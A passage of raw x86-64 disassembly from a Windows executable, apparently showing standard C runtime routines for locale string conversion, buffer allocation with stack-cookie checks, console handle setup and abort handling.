   14000ba9b:	e8 f4 7c ff ff       	call   0x140003794
   14000baa0:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   14000baa7:	e8 e8 7c ff ff       	call   0x140003794
   14000baac:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000bab3:	e8 dc 7c ff ff       	call   0x140003794
   14000bab8:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   14000babf:	e8 d0 7c ff ff       	call   0x140003794
   14000bac4:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   14000bacb:	e8 c4 7c ff ff       	call   0x140003794
   14000bad0:	48 83 c4 20          	add    $0x20,%rsp
   14000bad4:	5b                   	pop    %rbx
   14000bad5:	c3                   	ret
   14000bad6:	cc                   	int3
   14000bad7:	cc                   	int3
   14000bad8:	40 55                	rex push %rbp
   14000bada:	41 54                	push   %r12
   14000badc:	41 55                	push   %r13
   14000bade:	41 56                	push   %r14
   14000bae0:	41 57                	push   %r15
   14000bae2:	48 83 ec 50          	sub    $0x50,%rsp
   14000bae6:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000baeb:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   14000baef:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000baf3:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000baf7:	48 8b 05 02 d5 00 00 	mov    0xd502(%rip),%rax        # 0x140019000
   14000bafe:	48 33 c5             	xor    %rbp,%rax
   14000bb01:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000bb05:	8b 5d 60             	mov    0x60(%rbp),%ebx
   14000bb08:	33 ff                	xor    %edi,%edi
   14000bb0a:	4d 8b e1             	mov    %r9,%r12
   14000bb0d:	45 8b e8             	mov    %r8d,%r13d
   14000bb10:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   14000bb14:	85 db                	test   %ebx,%ebx
   14000bb16:	7e 2a                	jle    0x14000bb42
   14000bb18:	44 8b d3             	mov    %ebx,%r10d
   14000bb1b:	49 8b c1             	mov    %r9,%rax
   14000bb1e:	41 ff ca             	dec    %r10d
   14000bb21:	40 38 38             	cmp    %dil,(%rax)
   14000bb24:	74 0c                	je     0x14000bb32
   14000bb26:	48 ff c0             	inc    %rax
   14000bb29:	45 85 d2             	test   %r10d,%r10d
   14000bb2c:	75 f0                	jne    0x14000bb1e
   14000bb2e:	41 83 ca ff          	or     $0xffffffff,%r10d
   14000bb32:	8b c3                	mov    %ebx,%eax
   14000bb34:	41 2b c2             	sub    %r10d,%eax
   14000bb37:	ff c8                	dec    %eax
   14000bb39:	3b c3                	cmp    %ebx,%eax
   14000bb3b:	8d 58 01             	lea    0x1(%rax),%ebx
   14000bb3e:	7c 02                	jl     0x14000bb42
   14000bb40:	8b d8                	mov    %eax,%ebx
   14000bb42:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   14000bb46:	8b f7                	mov    %edi,%esi
   14000bb48:	45 85 f6             	test   %r14d,%r14d
   14000bb4b:	75 07                	jne    0x14000bb54
   14000bb4d:	48 8b 01             	mov    (%rcx),%rax
   14000bb50:	44 8b 70 04          	mov    0x4(%rax),%r14d
   14000bb54:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000bb5a:	44 8b cb             	mov    %ebx,%r9d
   14000bb5d:	4d 8b c4             	mov    %r12,%r8
   14000bb60:	1b d2                	sbb    %edx,%edx
   14000bb62:	41 8b ce             	mov    %r14d,%ecx
   14000bb65:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000bb69:	83 e2 08             	and    $0x8,%edx
   14000bb6c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000bb71:	ff c2                	inc    %edx
   14000bb73:	ff 15 37 56 00 00    	call   *0x5637(%rip)        # 0x1400111b0
   14000bb79:	4c 63 f8             	movslq %eax,%r15
   14000bb7c:	85 c0                	test   %eax,%eax
   14000bb7e:	75 07                	jne    0x14000bb87
   14000bb80:	33 c0                	xor    %eax,%eax
   14000bb82:	e9 17 02 00 00       	jmp    0x14000bd9e
   14000bb87:	49 b9 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r9
   14000bb8e:	ff ff 0f 
   14000bb91:	85 c0                	test   %eax,%eax
   14000bb93:	7e 6e                	jle    0x14000bc03
   14000bb95:	33 d2                	xor    %edx,%edx
   14000bb97:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000bb9b:	49 f7 f7             	div    %r15
   14000bb9e:	48 83 f8 02          	cmp    $0x2,%rax
   14000bba2:	72 5f                	jb     0x14000bc03
   14000bba4:	4b 8d 0c 3f          	lea    (%r15,%r15,1),%rcx
   14000bba8:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000bbac:	48 3b c1             	cmp    %rcx,%rax
   14000bbaf:	76 52                	jbe    0x14000bc03
   14000bbb1:	4a 8d 0c 7d 10 00 00 	lea    0x10(,%r15,2),%rcx
   14000bbb8:	00 
   14000bbb9:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000bbc0:	77 2a                	ja     0x14000bbec
   14000bbc2:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000bbc6:	48 3b c1             	cmp    %rcx,%rax
   14000bbc9:	77 03                	ja     0x14000bbce
   14000bbcb:	49 8b c1             	mov    %r9,%rax
   14000bbce:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000bbd2:	e8 19 e4 ff ff       	call   0x140009ff0
   14000bbd7:	48 2b e0             	sub    %rax,%rsp
   14000bbda:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   14000bbdf:	48 85 ff             	test   %rdi,%rdi
   14000bbe2:	74 9c                	je     0x14000bb80
   14000bbe4:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   14000bbea:	eb 13                	jmp    0x14000bbff
   14000bbec:	e8 3b 78 ff ff       	call   0x14000342c
   14000bbf1:	48 8b f8             	mov    %rax,%rdi
   14000bbf4:	48 85 c0             	test   %rax,%rax
   14000bbf7:	74 0a                	je     0x14000bc03
   14000bbf9:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bbff:	48 83 c7 10          	add    $0x10,%rdi
   14000bc03:	48 85 ff             	test   %rdi,%rdi
   14000bc06:	0f 84 74 ff ff ff    	je     0x14000bb80
   14000bc0c:	44 8b cb             	mov    %ebx,%r9d
   14000bc0f:	4d 8b c4             	mov    %r12,%r8
   14000bc12:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bc17:	41 8b ce             	mov    %r14d,%ecx
   14000bc1a:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000bc1f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000bc24:	ff 15 86 55 00 00    	call   *0x5586(%rip)        # 0x1400111b0
   14000bc2a:	85 c0                	test   %eax,%eax
   14000bc2c:	0f 84 59 01 00 00    	je     0x14000bd8b
   14000bc32:	4c 8b 65 00          	mov    0x0(%rbp),%r12
   14000bc36:	21 74 24 28          	and    %esi,0x28(%rsp)
   14000bc3a:	48 21 74 24 20       	and    %rsi,0x20(%rsp)
   14000bc3f:	49 8b cc             	mov    %r12,%rcx
   14000bc42:	45 8b cf             	mov    %r15d,%r9d
   14000bc45:	4c 8b c7             	mov    %rdi,%r8
   14000bc48:	41 8b d5             	mov    %r13d,%edx
   14000bc4b:	e8 bc 05 00 00       	call   0x14000c20c
   14000bc50:	48 63 f0             	movslq %eax,%rsi
   14000bc53:	85 c0                	test   %eax,%eax
   14000bc55:	0f 84 30 01 00 00    	je     0x14000bd8b
   14000bc5b:	41 b9 00 04 00 00    	mov    $0x400,%r9d
   14000bc61:	45 85 e9             	test   %r13d,%r9d
   14000bc64:	74 36                	je     0x14000bc9c
   14000bc66:	8b 4d 70             	mov    0x70(%rbp),%ecx
   14000bc69:	85 c9                	test   %ecx,%ecx
   14000bc6b:	0f 84 1a 01 00 00    	je     0x14000bd8b
   14000bc71:	3b f1                	cmp    %ecx,%esi
   14000bc73:	0f 8f 12 01 00 00    	jg     0x14000bd8b
   14000bc79:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000bc7d:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000bc81:	45 8b cf             	mov    %r15d,%r9d
   14000bc84:	4c 8b c7             	mov    %rdi,%r8
   14000bc87:	41 8b d5             	mov    %r13d,%edx
   14000bc8a:	49 8b cc             	mov    %r12,%rcx
   14000bc8d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000bc92:	e8 75 05 00 00       	call   0x14000c20c
   14000bc97:	e9 ef 00 00 00       	jmp    0x14000bd8b
   14000bc9c:	85 c0                	test   %eax,%eax
   14000bc9e:	7e 77                	jle    0x14000bd17
   14000bca0:	33 d2                	xor    %edx,%edx
   14000bca2:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000bca6:	48 f7 f6             	div    %rsi
   14000bca9:	48 83 f8 02          	cmp    $0x2,%rax
   14000bcad:	72 68                	jb     0x14000bd17
   14000bcaf:	48 8d 0c 36          	lea    (%rsi,%rsi,1),%rcx
   14000bcb3:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000bcb7:	48 3b c1             	cmp    %rcx,%rax
   14000bcba:	76 5b                	jbe    0x14000bd17
   14000bcbc:	48 8d 0c 75 10 00 00 	lea    0x10(,%rsi,2),%rcx
   14000bcc3:	00 
   14000bcc4:	49 3b c9             	cmp    %r9,%rcx
   14000bcc7:	77 35                	ja     0x14000bcfe
   14000bcc9:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000bccd:	48 3b c1             	cmp    %rcx,%rax
   14000bcd0:	77 0a                	ja     0x14000bcdc
   14000bcd2:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000bcd9:	ff ff 0f 
   14000bcdc:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000bce0:	e8 0b e3 ff ff       	call   0x140009ff0
   14000bce5:	48 2b e0             	sub    %rax,%rsp
   14000bce8:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   14000bced:	48 85 db             	test   %rbx,%rbx
   14000bcf0:	0f 84 95 00 00 00    	je     0x14000bd8b
   14000bcf6:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000bcfc:	eb 13                	jmp    0x14000bd11
   14000bcfe:	e8 29 77 ff ff       	call   0x14000342c
   14000bd03:	48 8b d8             	mov    %rax,%rbx
   14000bd06:	48 85 c0             	test   %rax,%rax
   14000bd09:	74 0e                	je     0x14000bd19
   14000bd0b:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bd11:	48 83 c3 10          	add    $0x10,%rbx
   14000bd15:	eb 02                	jmp    0x14000bd19
   14000bd17:	33 db                	xor    %ebx,%ebx
   14000bd19:	48 85 db             	test   %rbx,%rbx
   14000bd1c:	74 6d                	je     0x14000bd8b
   14000bd1e:	45 8b cf             	mov    %r15d,%r9d
   14000bd21:	4c 8b c7             	mov    %rdi,%r8
   14000bd24:	41 8b d5             	mov    %r13d,%edx
   14000bd27:	49 8b cc             	mov    %r12,%rcx
   14000bd2a:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000bd2e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bd33:	e8 d4 04 00 00       	call   0x14000c20c
   14000bd38:	33 c9                	xor    %ecx,%ecx
   14000bd3a:	85 c0                	test   %eax,%eax
   14000bd3c:	74 3c                	je     0x14000bd7a
   14000bd3e:	8b 45 70             	mov    0x70(%rbp),%eax
   14000bd41:	33 d2                	xor    %edx,%edx
   14000bd43:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   14000bd48:	44 8b ce             	mov    %esi,%r9d
   14000bd4b:	4c 8b c3             	mov    %rbx,%r8
   14000bd4e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000bd53:	85 c0                	test   %eax,%eax
   14000bd55:	75 0b                	jne    0x14000bd62
   14000bd57:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000bd5b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000bd60:	eb 0d                	jmp    0x14000bd6f
   14000bd62:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000bd66:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000bd6a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000bd6f:	41 8b ce             	mov    %r14d,%ecx
   14000bd72:	ff 15 08 54 00 00    	call   *0x5408(%rip)        # 0x140011180
   14000bd78:	8b f0                	mov    %eax,%esi
   14000bd7a:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000bd7e:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bd84:	75 05                	jne    0x14000bd8b
   14000bd86:	e8 09 7a ff ff       	call   0x140003794
   14000bd8b:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000bd8f:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bd95:	75 05                	jne    0x14000bd9c
   14000bd97:	e8 f8 79 ff ff       	call   0x140003794
   14000bd9c:	8b c6                	mov    %esi,%eax
   14000bd9e:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000bda2:	48 33 cd             	xor    %rbp,%rcx
   14000bda5:	e8 96 74 ff ff       	call   0x140003240
   14000bdaa:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000bdae:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000bdb2:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000bdb6:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000bdba:	41 5f                	pop    %r15
   14000bdbc:	41 5e                	pop    %r14
   14000bdbe:	41 5d                	pop    %r13
   14000bdc0:	41 5c                	pop    %r12
   14000bdc2:	5d                   	pop    %rbp
   14000bdc3:	c3                   	ret
   14000bdc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bdc9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000bdce:	57                   	push   %rdi
   14000bdcf:	48 83 ec 70          	sub    $0x70,%rsp
   14000bdd3:	48 8b f2             	mov    %rdx,%rsi
   14000bdd6:	48 8b d1             	mov    %rcx,%rdx
   14000bdd9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000bdde:	49 8b d9             	mov    %r9,%rbx
   14000bde1:	41 8b f8             	mov    %r8d,%edi
   14000bde4:	e8 53 91 ff ff       	call   0x140004f3c
   14000bde9:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000bdf0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000bdf5:	4c 8b cb             	mov    %rbx,%r9
   14000bdf8:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000bdfc:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000be03:	44 8b c7             	mov    %edi,%r8d
   14000be06:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000be0a:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000be11:	48 8b d6             	mov    %rsi,%rdx
   14000be14:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000be18:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000be1f:	00 
   14000be20:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000be25:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000be2c:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000be30:	e8 a3 fc ff ff       	call   0x14000bad8
   14000be35:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000be3a:	74 0c                	je     0x14000be48
   14000be3c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000be41:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000be48:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000be4d:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000be51:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000be55:	49 8b e3             	mov    %r11,%rsp
   14000be58:	5f                   	pop    %rdi
   14000be59:	c3                   	ret
   14000be5a:	cc                   	int3
   14000be5b:	cc                   	int3
   14000be5c:	40 55                	rex push %rbp
   14000be5e:	41 54                	push   %r12
   14000be60:	41 55                	push   %r13
   14000be62:	41 56                	push   %r14
   14000be64:	41 57                	push   %r15
   14000be66:	48 83 ec 40          	sub    $0x40,%rsp
   14000be6a:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000be6f:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   14000be73:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000be77:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000be7b:	48 8b 05 7e d1 00 00 	mov    0xd17e(%rip),%rax        # 0x140019000
   14000be82:	48 33 c5             	xor    %rbp,%rax
   14000be85:	48 89 45 00          	mov    %rax,0x0(%rbp)
   14000be89:	44 8b 75 68          	mov    0x68(%rbp),%r14d
   14000be8d:	33 ff                	xor    %edi,%edi
   14000be8f:	45 8b f9             	mov    %r9d,%r15d
   14000be92:	4d 8b e0             	mov    %r8,%r12
   14000be95:	44 8b ea             	mov    %edx,%r13d
   14000be98:	45 85 f6             	test   %r14d,%r14d
   14000be9b:	75 07                	jne    0x14000bea4
   14000be9d:	48 8b 01             	mov    (%rcx),%rax
   14000bea0:	44 8b 70 04          	mov    0x4(%rax),%r14d
   14000bea4:	f7 5d 70             	negl   0x70(%rbp)
   14000bea7:	41 8b ce             	mov    %r14d,%ecx
   14000beaa:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000beae:	1b d2                	sbb    %edx,%edx
   14000beb0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000beb5:	83 e2 08             	and    $0x8,%edx
   14000beb8:	ff c2                	inc    %edx
   14000beba:	ff 15 f0 52 00 00    	call   *0x52f0(%rip)        # 0x1400111b0
   14000bec0:	48 63 f0             	movslq %eax,%rsi
   14000bec3:	85 c0                	test   %eax,%eax
   14000bec5:	75 07                	jne    0x14000bece
   14000bec7:	33 c0                	xor    %eax,%eax
   14000bec9:	e9 de 00 00 00       	jmp    0x14000bfac
   14000bece:	7e 77                	jle    0x14000bf47
   14000bed0:	48 b8 f0 ff ff ff ff 	movabs $0x7ffffffffffffff0,%rax
   14000bed7:	ff ff 7f 
   14000beda:	48 3b f0             	cmp    %rax,%rsi
   14000bedd:	77 68                	ja     0x14000bf47
   14000bedf:	48 8d 0c 36          	lea    (%rsi,%rsi,1),%rcx
   14000bee3:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000bee7:	48 3b c1             	cmp    %rcx,%rax
   14000beea:	76 5b                	jbe    0x14000bf47
   14000beec:	48 8d 0c 75 10 00 00 	lea    0x10(,%rsi,2),%rcx
   14000bef3:	00 
   14000bef4:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000befb:	77 31                	ja     0x14000bf2e
   14000befd:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000bf01:	48 3b c1             	cmp    %rcx,%rax
   14000bf04:	77 0a                	ja     0x14000bf10
   14000bf06:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000bf0d:	ff ff 0f 
   14000bf10:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000bf14:	e8 d7 e0 ff ff       	call   0x140009ff0
   14000bf19:	48 2b e0             	sub    %rax,%rsp
   14000bf1c:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   14000bf21:	48 85 db             	test   %rbx,%rbx
   14000bf24:	74 a1                	je     0x14000bec7
   14000bf26:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000bf2c:	eb 13                	jmp    0x14000bf41
   14000bf2e:	e8 f9 74 ff ff       	call   0x14000342c
   14000bf33:	48 8b d8             	mov    %rax,%rbx
   14000bf36:	48 85 c0             	test   %rax,%rax
   14000bf39:	74 0f                	je     0x14000bf4a
   14000bf3b:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bf41:	48 83 c3 10          	add    $0x10,%rbx
   14000bf45:	eb 03                	jmp    0x14000bf4a
   14000bf47:	48 8b df             	mov    %rdi,%rbx
   14000bf4a:	48 85 db             	test   %rbx,%rbx
   14000bf4d:	0f 84 74 ff ff ff    	je     0x14000bec7
   14000bf53:	4c 8b c6             	mov    %rsi,%r8
   14000bf56:	33 d2                	xor    %edx,%edx
   14000bf58:	48 8b cb             	mov    %rbx,%rcx
   14000bf5b:	4d 03 c0             	add    %r8,%r8
   14000bf5e:	e8 3d 68 ff ff       	call   0x1400027a0
   14000bf63:	45 8b cf             	mov    %r15d,%r9d
   14000bf66:	4d 8b c4             	mov    %r12,%r8
   14000bf69:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bf6e:	41 8b ce             	mov    %r14d,%ecx
   14000bf71:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000bf75:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bf7a:	ff 15 30 52 00 00    	call   *0x5230(%rip)        # 0x1400111b0
   14000bf80:	85 c0                	test   %eax,%eax
   14000bf82:	74 15                	je     0x14000bf99
   14000bf84:	4c 8b 4d 60          	mov    0x60(%rbp),%r9
   14000bf88:	44 8b c0             	mov    %eax,%r8d
   14000bf8b:	48 8b d3             	mov    %rbx,%rdx
   14000bf8e:	41 8b cd             	mov    %r13d,%ecx
   14000bf91:	ff 15 b9 52 00 00    	call   *0x52b9(%rip)        # 0x140011250
   14000bf97:	8b f8                	mov    %eax,%edi
   14000bf99:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000bf9d:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bfa3:	75 05                	jne    0x14000bfaa
   14000bfa5:	e8 ea 77 ff ff       	call   0x140003794
   14000bfaa:	8b c7                	mov    %edi,%eax
   14000bfac:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   14000bfb0:	48 33 cd             	xor    %rbp,%rcx
   14000bfb3:	e8 88 72 ff ff       	call   0x140003240
   14000bfb8:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000bfbc:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000bfc0:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000bfc4:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000bfc8:	41 5f                	pop    %r15
   14000bfca:	41 5e                	pop    %r14
   14000bfcc:	41 5d                	pop    %r13
   14000bfce:	41 5c                	pop    %r12
   14000bfd0:	5d                   	pop    %rbp
   14000bfd1:	c3                   	ret
   14000bfd2:	cc                   	int3
   14000bfd3:	cc                   	int3
   14000bfd4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bfd9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000bfde:	57                   	push   %rdi
   14000bfdf:	48 83 ec 60          	sub    $0x60,%rsp
   14000bfe3:	8b f2                	mov    %edx,%esi
   14000bfe5:	48 8b d1             	mov    %rcx,%rdx
   14000bfe8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000bfed:	41 8b d9             	mov    %r9d,%ebx
   14000bff0:	49 8b f8             	mov    %r8,%rdi
   14000bff3:	e8 44 8f ff ff       	call   0x140004f3c
   14000bff8:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000bfff:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000c004:	44 8b cb             	mov    %ebx,%r9d
   14000c007:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000c00b:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   14000c012:	4c 8b c7             	mov    %rdi,%r8
   14000c015:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000c019:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   14000c020:	00 
   14000c021:	8b d6                	mov    %esi,%edx
   14000c023:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c028:	e8 2f fe ff ff       	call   0x14000be5c
   14000c02d:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000c032:	74 0c                	je     0x14000c040
   14000c034:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000c039:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000c040:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000c045:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000c04a:	48 83 c4 60          	add    $0x60,%rsp
   14000c04e:	5f                   	pop    %rdi
   14000c04f:	c3                   	ret
   14000c050:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000c055:	e9 ca ae ff ff       	jmp    0x140006f24
   14000c05a:	cc                   	int3
   14000c05b:	cc                   	int3
   14000c05c:	48 83 ec 28          	sub    $0x28,%rsp
   14000c060:	48 8b 0d 11 e2 00 00 	mov    0xe211(%rip),%rcx        # 0x14001a278
   14000c067:	48 8d 41 02          	lea    0x2(%rcx),%rax
   14000c06b:	48 83 f8 01          	cmp    $0x1,%rax
   14000c06f:	76 06                	jbe    0x14000c077
   14000c071:	ff 15 89 4f 00 00    	call   *0x4f89(%rip)        # 0x140011000
   14000c077:	48 83 c4 28          	add    $0x28,%rsp
   14000c07b:	c3                   	ret
   14000c07c:	48 83 ec 48          	sub    $0x48,%rsp
   14000c080:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000c086:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000c08b:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000c091:	48 8d 0d 68 7c 00 00 	lea    0x7c68(%rip),%rcx        # 0x140013d00
   14000c098:	45 33 c9             	xor    %r9d,%r9d
   14000c09b:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000c0a0:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000c0a5:	ff 15 9d 51 00 00    	call   *0x519d(%rip)        # 0x140011248
   14000c0ab:	48 89 05 c6 e1 00 00 	mov    %rax,0xe1c6(%rip)        # 0x14001a278
   14000c0b2:	48 83 c4 48          	add    $0x48,%rsp
   14000c0b6:	c3                   	ret
   14000c0b7:	cc                   	int3
   14000c0b8:	48 83 ec 28          	sub    $0x28,%rsp
   14000c0bc:	48 85 c9             	test   %rcx,%rcx
   14000c0bf:	75 19                	jne    0x14000c0da
   14000c0c1:	e8 b2 84 ff ff       	call   0x140004578
   14000c0c6:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000c0cc:	e8 57 80 ff ff       	call   0x140004128
   14000c0d1:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000c0d5:	48 83 c4 28          	add    $0x28,%rsp
   14000c0d9:	c3                   	ret
   14000c0da:	4c 8b c1             	mov    %rcx,%r8
   14000c0dd:	48 8b 0d 8c f0 00 00 	mov    0xf08c(%rip),%rcx        # 0x14001b170
   14000c0e4:	33 d2                	xor    %edx,%edx
   14000c0e6:	48 83 c4 28          	add    $0x28,%rsp
   14000c0ea:	48 ff 25 67 51 00 00 	rex.W jmp *0x5167(%rip)        # 0x140011258
   14000c0f1:	cc                   	int3
   14000c0f2:	cc                   	int3
   14000c0f3:	cc                   	int3
   14000c0f4:	48 83 ec 28          	sub    $0x28,%rsp
   14000c0f8:	e8 f3 e0 ff ff       	call   0x14000a1f0
   14000c0fd:	48 85 c0             	test   %rax,%rax
   14000c100:	74 0a                	je     0x14000c10c
   14000c102:	b9 16 00 00 00       	mov    $0x16,%ecx
   14000c107:	e8 14 e1 ff ff       	call   0x14000a220
   14000c10c:	f6 05 6d e1 00 00 02 	testb  $0x2,0xe16d(%rip)        # 0x14001a280
   14000c113:	74 29                	je     0x14000c13e
   14000c115:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000c11a:	e8 ad 43 00 00       	call   0x1400104cc
   14000c11f:	85 c0                	test   %eax,%eax
   14000c121:	74 07                	je     0x14000c12a
   14000c123:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000c128:	cd 29                	int    $0x29
   14000c12a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c130:	ba 15 00 00 40       	mov    $0x40000015,%edx
   14000c135:	41 8d 48 02          	lea    0x2(%r8),%ecx
   14000c139:	e8 86 7e ff ff       	call   0x140003fc4
   14000c13e:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000c143:	e8 bc ae ff ff       	call   0x140007004
   14000c148:	cc                   	int3
   14000c149:	cc                   	int3
   14000c14a:	cc                   	int3
   14000c14b:	cc                   	int3
   14000c14c:	48 8b c4             	mov    %rsp,%rax
   14000c14f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000c153:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000c157:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000c15b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000c15f:	41 56                	push   %r14
   14000c161:	48 83 ec 20          	sub    $0x20,%rsp
   14000c165:	48 8b e9             	mov    %rcx,%rbp
   14000c168:	33 ff                	xor    %edi,%edi
   14000c16a:	be e3 00 00 00       	mov    $0xe3,%esi
   14000c16f:	4c 8d 35 da 89 00 00 	lea    0x89da(%rip),%r14        # 0x140014b50
   14000c176:	8d 04 3e             	lea    (%rsi,%rdi,1),%eax
   14000c179:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   14000c17f:	48 8b cd             	mov    %rbp,%rcx
   14000c182:	99                   	cltd
   14000c183:	2b c2                	sub    %edx,%eax
   14000c185:	d1 f8                	sar    $1,%eax
